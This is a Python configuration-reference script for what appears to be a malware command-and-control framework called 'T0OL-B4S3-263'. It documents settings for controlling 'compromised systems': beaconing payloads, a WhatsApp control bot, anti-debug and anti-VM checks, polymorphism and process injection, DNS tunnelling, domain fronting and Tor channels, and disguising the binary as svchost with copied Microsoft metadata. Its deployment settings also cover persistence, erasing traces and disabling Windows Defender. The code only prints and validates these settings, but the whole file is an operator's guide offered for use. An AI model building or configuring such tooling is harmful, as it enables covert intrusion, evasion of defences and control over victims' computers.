#!/usr/bin/env python3
"""
QUICK REFERENCE - T0OL-B4S3-263 Configuration Variables
This file documents all configuration fields used across the framework
"""

CONFIGURATION_REFERENCE = {
    # ═══════════════════════════════════════════════════════════════════════
    # C2 SERVER CONFIGURATION
    # ═══════════════════════════════════════════════════════════════════════
    "c2_server": {
        "host": {
            "type": "string",
            "description": "C2 server listening address",
            "default": "0.0.0.0",
            "example": "192.168.1.100",
            "notes": "Use 0.0.0.0 to listen on all interfaces"
        },
        "port": {
            "type": "integer",
            "description": "C2 server listening port",
            "default": 5000,
            "range": "1-65535",
            "example": 5000,
            "notes": "Ports 1-1024 require elevated privileges"
        },
        "encryption_key": {
            "type": "string (Fernet)",
            "description": "Symmetric encryption key for all communications",
            "default": "Auto-generated",
            "length": 44,
            "example": "kB4x6yZ9wQ2jL5pM8nV1fG4hJ7kL0oP3qR6sT9u",
            "notes": "Generate with: from cryptography.fernet import Fernet; Fernet.generate_key()"
        },
        "max_sessions": {
            "type": "integer",
            "description": "Maximum concurrent compromised systems",
            "default": 1000,
            "notes": "Higher values require more memory"
        },
        "command_timeout": {
            "type": "integer",
            "description": "Command execution timeout in seconds",
            "default": 30,
            "notes": "Set to 120 for netscan, 300 for timelapse"
        },
        "database_path": {
            "type": "string",
            "description": "Path to SQLite session database",
            "default": "sessions.db",
            "example": "/var/lib/c2/sessions.db"
        }
    },

    # ═══════════════════════════════════════════════════════════════════════
    # PAYLOAD CONFIGURATION
    # ═══════════════════════════════════════════════════════════════════════
    "payload": {
        "c2_host": {
            "type": "string (hostname/IP)",
            "description": "C2 server payload connects to",
            "example": "192.168.1.100",
            "notes": "Must be reachable from target network"
        },
        "c2_port": {
            "type": "integer",
            "description": "C2 server port payload connects to",
            "example": 5000,
            "notes": "Should match C2 server listening port"
        },
        "beacon_interval": {
            "type": "integer (seconds)",
            "description": "How often payload checks in with C2",
            "default": 30,
            "range": "5-3600",
            "notes": "Lower = faster response, higher = less suspicious"
        },
        "jitter": {
            "type": "integer (seconds)",
            "description": "Random delay added to beacon interval",
            "default": 10,
            "example": 10,
            "notes": "Interval varies: beacon_interval ± jitter"
        },
        "encryption_key": {
            "type": "string (Fernet)",
            "description": "Must match C2 server encryption key",
            "notes": "Copy from C2 server configuration"
        },
        "obfuscation_level": {
            "type": "enum",
            "options": ["minimal", "normal", "aggressive", "maximum"],
            "default": "maximum",
            "notes": "Higher = more detection evasion, larger file size"
        },
        "startup_args": {
            "type": "string",
            "description": "Command line arguments to pass to payload",
            "default": "--hidden",
            "notes": "Common: --hidden, --service, --no-persist"
        }
    },

    # ═══════════════════════════════════════════════════════════════════════
    # WHATSAPP BOT CONFIGURATION
    # ═══════════════════════════════════════════════════════════════════════
    "whatsapp_bot": {
        "admin_numbers": {
            "type": "list of strings",
            "description": "Phone numbers authorized to send commands",
            "format": "+[country_code][number]",
            "example": ["+12025551234", "+447911123456"],
            "notes": "Only these numbers can control the bot"
        },
        "c2_host": {
            "type": "string (hostname/IP)",
            "description": "C2 server the bot connects to",
            "example": "192.168.1.100",
            "notes": "Must match C2 server listening address"
        },
        "c2_port": {
            "type": "integer",
            "description": "C2 server port the bot connects to",
            "example": 5000,
            "notes": "Must match C2 server listening port"
        },
        "encryption_key": {
            "type": "string (Fernet)",
            "description": "Encryption key for C2 communication",
            "notes": "Copy from C2 server, must match payload"
        },
        "session_timeout": {
            "type": "integer (seconds)",
            "description": "Disconnect bot after inactivity",
            "default": 3600,
            "notes": "Reduces resource usage"
        },
        "message_format": {
            "type": "enum",
            "options": ["text", "formatted", "rich"],
            "default": "formatted",
            "notes": "rich = colored output, formatted = tables"
        }
    },

    # ═══════════════════════════════════════════════════════════════════════
    # OBFUSCATION CONFIGURATION
    # ═══════════════════════════════════════════════════════════════════════
    "obfuscation": {
        "level": {
            "type": "enum",
            "options": ["minimal", "normal", "aggressive", "maximum"],
            "default": "maximum",
            "details": {
                "minimal": "String encoding only (+5% size)",
                "normal": "String + control flow + debug (+15% size)",
                "aggressive": "+ dead code, VM checks (+30% size)",
                "maximum": "+ polymorphism, process injection (+50% size)"
            }
        },
        "string_encoding_depth": {
            "type": "integer",
            "description": "How many times to encode strings",
            "default": 5,
            "range": "1-10",
            "notes": "Higher = slower execution, better evasion"
        },
        "junk_code_ratio": {
            "type": "float (0-1)",
            "description": "Proportion of irrelevant code to add",
            "default": 0.3,
            "example": 0.3,
            "notes": "0.3 = 30% padding, increases file size"
        },
        "anti_debug": {
            "type": "boolean",
            "description": "Enable debugger detection",
            "default": True,
            "notes": "Exits silently if debugger detected"
        },
        "anti_vm": {
            "type": "boolean",
            "description": "Enable virtual machine detection",
            "default": True,
            "notes": "Exits if running in VM"
        },
        "polymorphic": {
            "type": "boolean",
            "description": "Generate unique code variants",
            "default": True,
            "notes": "Each compilation produces different hash"
        }
    },

    # ═══════════════════════════════════════════════════════════════════════
    # MULTI-CHANNEL C2 CONFIGURATION
    # ═══════════════════════════════════════════════════════════════════════
    "c2_channels": {
        "https_direct": {
            "type": "primary channel",
            "host": "string (domain or IP)",
            "port": "integer (usually 443)",
            "ssl_verify": "boolean (default: False)",
            "reliability": "high",
            "speed": "fast",
            "detection_risk": "medium",
            "notes": "Default, fastest, but visible in network traffic"
        },
        "dns_tunnel": {
            "host": "string (authoritative DNS)",
            "record_type": "enum [A, TXT, CNAME]",
            "domain": "string",
            "reliability": "medium",
            "speed": "slow",
            "detection_risk": "low",
            "notes": "Bypass firewall, but slow data transfer"
        },
        "domain_fronting": {
            "fronting_domain": "string (e.g., cloudflare.com)",
            "host_header": "string (C2 domain)",
            "port": "integer (usually 443)",
            "reliability": "high",
            "speed": "fast",
            "detection_risk": "low",
            "notes": "Route through major CDN"
        },
        "tor": {
            "socks_host": "string (127.0.0.1)",
            "socks_port": "integer (usually 9050)",
            "reliability": "medium",
            "speed": "slow",
            "detection_risk": "very_low",
            "notes": "Most anonymous but slowest"
        }
    },

    # ═══════════════════════════════════════════════════════════════════════
    # PAYLOAD CUSTOMIZATION
    # ═══════════════════════════════════════════════════════════════════════
    "payload_custom": {
        "display_name": {
            "type": "string",
            "description": "Executable name (without .exe)",
            "default": "svchost",
            "examples": ["svchost", "runtime", "update", "winlogon"],
            "notes": "Mislead users about what's running"
        },
        "pe_version": {
            "file_version": "string (e.g. 10.0.19041.0)",
            "product_version": "string",
            "company": "string (e.g. Microsoft Corporation)",
            "description": "string (e.g. Service Host Process)",
            "notes": "Copy from legitimate Windows files"
        },
        "compilation": {
            "use_upx": "boolean (compress binary)",
            "use_pyarmor": "boolean (encrypt Python bytecode)",
            "use_nuitka": "boolean (compile to C++)",
            "notes": "Combination reduces file size and detection"
        },
        "icon": {
            "type": "string (path to .ico file)",
            "description": "Custom icon file",
            "notes": "Use legitimate Windows icon for stealth"
        }
    },

    # ═══════════════════════════════════════════════════════════════════════
    # DATABASE CONFIGURATION
    # ═══════════════════════════════════════════════════════════════════════
    "database": {
        "type": {
            "type": "enum",
            "options": ["sqlite", "mysql", "postgresql"],
            "default": "sqlite",
            "notes": "sqlite = local, others = centralized"
        },
        "path": {
            "type": "string",
            "description": "SQLite database file path",
            "default": "sessions.db",
            "example": "/var/lib/c2/sessions.db",
            "notes": "For SQLite only"
        },
        "host": {
            "type": "string",
            "description": "Database server hostname",
            "notes": "For MySQL/PostgreSQL only"
        },
        "port": {
            "type": "integer",
            "description": "Database server port",
            "notes": "MySQL=3306, PostgreSQL=5432"
        },
        "username": {
            "type": "string",
            "description": "Database authentication user"
        },
        "password": {
            "type": "string",
            "description": "Database authentication password"
        },
        "encryption_at_rest": {
            "type": "boolean",
            "description": "Encrypt database contents",
            "default": False,
            "notes": "Requires SQLCipher"
        }
    },

    # ═══════════════════════════════════════════════════════════════════════
    # DEPLOYMENT CONFIGURATION
    # ═══════════════════════════════════════════════════════════════════════
    "deployment": {
        "method": {
            "type": "enum",
            "options": ["powershell", "msi", "batch", "dll_injection", "scheduled_task"],
            "default": "powershell",
            "notes": "Method to deploy payload on target"
        },
        "persistence": {
            "type": "enum",
            "options": ["scheduled_task", "registry", "startup_folder", "service"],
            "default": "scheduled_task",
            "notes": "How to survive system reboot"
        },
        "cleanup_on_uninstall": {
            "type": "boolean",
            "description": "Remove all traces when uninstalling",
            "default": True,
            "notes": "Clears temp files, registry, logs"
        },
        "disable_av": {
            "type": "boolean",
            "description": "Disable Windows Defender on target",
            "default": True,
            "notes": "Requires admin privileges"
        }
    }
}


def display_reference():
    """Display formatted configuration reference"""
    print("\n╔════════════════════════════════════════════════════════════════════╗")
    print("║  T0OL-B4S3-263 CONFIGURATION REFERENCE                            ║")
    print("╚════════════════════════════════════════════════════════════════════╝\n")
    
    for section, fields in CONFIGURATION_REFERENCE.items():
        print(f"\n{'═' * 70}")
        print(f"  {section.upper().replace('_', ' ')}")
        print(f"{'═' * 70}\n")
        
        for field_name, field_info in fields.items():
            print(f"  {field_name}")
            for key, value in field_info.items():
                if isinstance(value, dict):
                    print(f"    {key}:")
                    for k, v in value.items():
                        print(f"      {k}: {v}")
                else:
                    print(f"    {key}: {value}")
            print()


def get_field_info(section: str, field: str) -> dict:
    """Get specific field information"""
    if section in CONFIGURATION_REFERENCE:
        if field in CONFIGURATION_REFERENCE[section]:
            return CONFIGURATION_REFERENCE[section][field]
    return {}


def validate_config_value(section: str, field: str, value) -> tuple[bool, str]:
    """Validate a configuration value"""
    field_info = get_field_info(section, field)
    
    if not field_info:
        return False, f"Unknown field: {section}.{field}"
    
    field_type = field_info.get("type", "string")
    
    # Type validation
    if field_type == "integer" or field_type.startswith("integer"):
        try:
            int_val = int(value)
            if "range" in field_info:
                range_str = field_info["range"]
                min_val, max_val = map(int, range_str.split("-"))
                if not (min_val <= int_val <= max_val):
                    return False, f"Value out of range {range_str}"
            return True, "Valid"
        except ValueError:
            return False, "Not an integer"
    
    elif field_type == "boolean":
        if str(value).lower() in ["true", "false", "1", "0", "yes", "no"]:
            return True, "Valid"
        return False, "Must be boolean"
    
    elif "enum" in field_type:
        options = field_info.get("options", [])
        if value in options:
            return True, "Valid"
        return False, f"Must be one of: {', '.join(options)}"
    
    return True, "Valid"


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        section = sys.argv[1]
        if len(sys.argv) > 2:
            field = sys.argv[2]
            info = get_field_info(section, field)
            if info:
                print(f"\n{section}.{field}:")
                for key, value in info.items():
                    print(f"  {key}: {value}")
            else:
                print(f"Field not found: {section}.{field}")
        else:
            print(f"\nConfiguration Reference - {section}:")
            if section in CONFIGURATION_REFERENCE:
                for field_name in CONFIGURATION_REFERENCE[section]:
                    print(f"  - {field_name}")
            else:
                print(f"Section not found: {section}")
    else:
        display_reference()
